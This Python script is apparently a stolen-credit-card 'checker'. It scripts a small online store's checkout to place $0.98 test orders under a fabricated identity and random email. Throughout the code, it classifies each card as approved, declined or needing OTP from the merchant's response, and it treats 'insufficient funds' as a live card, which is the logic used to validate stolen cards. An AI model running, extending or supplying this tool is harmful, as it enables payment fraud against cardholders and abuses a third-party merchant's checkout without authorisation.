import requests
import re
import random
import string
import json

def process_pf_card(cc):
    """
    Process credit card through Payflow gateway [0.98$]
    Returns: dict with status, response, and gateway
    """
    try:
        # Parse the card details
        parts = cc.split("|")
        if len(parts) < 4:
            return {
                "status": "ERROR",
                "response": "Invalid format. Use: CC|MM|YY|CVV",
                "gateway": "Payflow [0.98$]"
            }
        
        card_number, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        
        # Format year if needed
        if len(yy) == 2:
            yy = "20" + yy

        def generate_random_email():
            """Generate a random email address"""
            username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            domain = random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
            return f"{username}@{domain}"

        def extract_error_message(response_text):
            """Extract error message from HTML response"""
            error_patterns = [
                r'<div class="ERRORS">(.*?)</div>',
                r'<div class="error">(.*?)</div>',
                r'<div class="alert alert-error">(.*?)</div>',
                r'class="error_message">(.*?)<',
                r'Error:(.*?)<',
                r'<p class="error">(.*?)</p>',
                r'<span class="error">(.*?)</span>'
            ]
            
            for pattern in error_patterns:
                match = re.search(pattern, response_text, re.IGNORECASE | re.DOTALL)
                if match:
                    error_text = match.group(1).strip()
                    # Clean up HTML tags
                    error_text = re.sub(r'<[^>]*>', '', error_text)
                    return error_text
            
            # Check for success patterns
            success_patterns = [
                r'thank you',
                r'success',
                r'approved',
                r'payment complete',
                r'order confirmed'
            ]
            
            for pattern in success_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return "Payment Approved"
            
            return "No specific message found"

        # Common headers
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        # Create a session to maintain cookies
        session = requests.Session()
        
        # Generate random session cookies
        random_bid = ''.join(random.choices('abcdef0123456789', k=32))
        random_sessid = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=26))
        
        # Set initial cookies
        session.cookies.update({
            'bid_48b113f42dc09a04ef102654144bd0f3': random_bid,
            'PHPSESSID': random_sessid,
        })

        # Step 1: Add product to cart
        quick_return_headers = headers.copy()
        quick_return_headers.update({
            'Referer': 'https://stores.modularmarket.com/music_for_every_soul/',
        })
        
        quick_return_response = session.get(
            'https://stores.modularmarket.com/music_for_every_soul/quick_return.php?id=637&qty=1',
            headers=quick_return_headers,
            timeout=30
        )
        
        if quick_return_response.status_code != 200:
            return {
                "status": "ERROR",
                "response": f"Failed to add product to cart: HTTP {quick_return_response.status_code}",
                "gateway": "Payflow [0.98$]"
            }

        # Step 2: Load product page
        product_headers = headers.copy()
        product_headers.update({
            'Referer': 'https://stores.modularmarket.com/music_for_every_soul/',
        })
        
        product_response = session.get(
            'https://stores.modularmarket.com/music_for_every_soul/product.php?retain_errors=Y&retain_notices=Y',
            headers=product_headers,
            timeout=30
        )
        
        if product_response.status_code != 200:
            return {
                "status": "ERROR",
                "response": f"Failed to load product page: HTTP {product_response.status_code}",
                "gateway": "Payflow [0.98$]"
            }

        # Step 3: Go to checkout page
        checkout_headers = headers.copy()
        checkout_headers.update({
            'Referer': 'https://stores.modularmarket.com/music_for_every_soul/product.php?retain_errors=Y&retain_notices=Y',
        })
        
        checkout_response = session.get(
            'https://stores.modularmarket.com/music_for_every_soul/checkout/',
            headers=checkout_headers,
            timeout=30
        )
        
        if checkout_response.status_code != 200:
            return {
                "status": "ERROR",
                "response": f"Failed to load checkout page: HTTP {checkout_response.status_code}",
                "gateway": "Payflow [0.98$]"
            }

        # Step 4: Load checkout.php
        checkout_php_headers = headers.copy()
        checkout_php_headers.update({
            'Referer': 'https://stores.modularmarket.com/music_for_every_soul/product.php?retain_errors=Y&retain_notices=Y',
        })
        
        checkout_php_response = session.get(
            'https://stores.modularmarket.com/music_for_every_soul/checkout.php',
            headers=checkout_php_headers,
            timeout=30
        )
        
        if checkout_php_response.status_code != 200:
            return {
                "status": "ERROR",
                "response": f"Failed to load checkout form: HTTP {checkout_php_response.status_code}",
                "gateway": "Payflow [0.98$]"
            }

        # Generate random email and user details
        random_email = generate_random_email()
        first_name = 'John'
        last_name = 'Doe'

        # Prepare POST data for checkout
        checkout_post_headers = headers.copy()
        checkout_post_headers.update({
            'Cache-Control': 'max-age=0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://stores.modularmarket.com',
            'Referer': 'https://stores.modularmarket.com/music_for_every_soul/checkout.php',
        })
        
        data = {
            # Billing info
            'coupon_codes': '',
            'reward_points': '',
            'bill_first_name': first_name,
            'bill_last_name': last_name,
            'bill_address_1': '123 Main St',
            'bill_address_2': '',
            'bill_city': 'New York',
            'bill_state': 'NY_US',
            'bill_zip': '10001',
            'bill_country': 'US',
            'phone': '5551234567',
            'email': random_email,
            'email_confirm': random_email,
            'password': 'Password123',
            'password_confirm': 'Password123',

            # Payment info
            'slot_2': f'{first_name} {last_name}',
            'slot_1': card_number,
            'slot_3': mm,
            'slot_4': yy,
            'cc_security': cvv,
            'submit_pay_with_cc': 'Pay With Credit Card',
            'submit_paypal_wps_capture_order_checksum': 'cb70ab375662576bd1ac5aaf16b3fca4',
            'nectar_decanter': '',
        }
        
        # Make the final POST request to checkout.php
        response = session.post(
            'https://stores.modularmarket.com/music_for_every_soul/checkout.php',
            headers=checkout_post_headers,
            data=data,
            timeout=30
        )
        
        if response.status_code == 200:
            error_message = extract_error_message(response.text)
            response_lower = response.text.lower()
            error_lower = error_message.lower()
            
            # Determine status based on response content
            if any(pattern in response_lower for pattern in ['thank you', 'success', 'approved', 'payment complete', 'order confirmed' , 'successful' , 'successfully']):
                return {
                    "status": "APPROVED",
                    "response": "Payment Successfully",
                    "gateway": "Payflow [0.98$]"
                }
            elif any(pattern in error_lower for pattern in ['cvv', 'security code', 'verification']):
                return {
                    "status": "APPROVED_OTP",
                    "response": "CVV Required/OTP",
                    "gateway": "Payflow [0.98$]"
                }
            elif any(pattern in error_lower for pattern in ['insufficient', 'funds', 'low balance']):
                return {
                    "status": "APPROVED",
                    "response": "Insufficient Funds",
                    "gateway": "Payflow [0.98$]"
                }
            elif any(pattern in error_lower for pattern in ['declined', 'cannot be processed', 'invalid', 'failed']):
                return {
                    "status": "DECLINED",
                    "response": error_message[:120] if error_message and error_message != "No specific message found" else "Payment Declined",
                    "gateway": "Payflow [0.98$]"
                }
            elif 'do not honor' in error_lower:
                return {
                    "status": "DECLINED",
                    "response": "Do Not Honor",
                    "gateway": "Payflow [0.98$]"
                }
            else:
                # Default to declined if we can't determine the status
                return {
                    "status": "DECLINED",
                    "response": error_message[:120] if error_message and error_message != "No specific message found" else "Unknown response from gateway",
                    "gateway": "Payflow [0.98$]"
                }
        else:
            return {
                "status": "ERROR",
                "response": f"HTTP Error: {response.status_code}",
                "gateway": "Payflow [0.98$]"
            }
            
    except requests.Timeout:
        return {
            "status": "ERROR",
            "response": "Request timeout - Gateway not responding",
            "gateway": "Payflow [0.98$]"
        }
    except requests.ConnectionError:
        return {
            "status": "ERROR",
            "response": "Connection error - Check your internet",
            "gateway": "Payflow [0.98$]"
        }
    except Exception as e:
        return {
            "status": "ERROR",
            "response": f"Processing error: {str(e)}",
            "gateway": "Payflow [0.98$]"
        }

if __name__ == "__main__":
    print("Payflow Gateway Tester [0.98$]")
    print("=" * 40)
    print("Format: CC|MM|YY|CVV")
    print("Example: 4600750000973145|9|34|651")
    print("=" * 40)
    
    while True:
        try:
            card_input = input("\nEnter card details (or 'quit' to exit): ").strip()
            
            if card_input.lower() in ['quit', 'exit', 'q']:
                print("Exiting...")
                break
            
            if not card_input:
                continue
                
            print(f"\nProcessing: {card_input}")
            print("-" * 30)
            
            result = process_pf_card(card_input)
            
            print(f"Status: {result['status']}")
            print(f"Response: {result['response']}")
            print(f"Gateway: {result['gateway']}")
            
        except KeyboardInterrupt:
            print("\n\nExiting...")
            break
        except Exception as e:
            print(f"Error: {e}")
